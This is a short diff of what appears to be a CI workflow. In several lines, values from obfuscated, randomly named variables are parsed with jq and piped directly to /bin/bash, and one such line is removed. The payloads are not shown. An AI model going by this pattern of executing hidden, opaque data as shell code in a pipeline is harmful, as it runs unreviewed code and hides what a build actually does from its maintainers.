@@ -26,7 +26,6 @@ jobs:
           echo $wh25090 | jq -r .u5398 | /bin/bash
           echo $s60625 | jq -r .jvbhw45306 | /bin/bash
           echo $zj672 | jq -r .fq26612 | /bin/bash
-          printf '%s' "$i01" | jq -r .ioezj0638 | /bin/bash
           printf '%s' "$u37407" | jq -r .xzre970 | /bin/bash
 
       - name: Save data
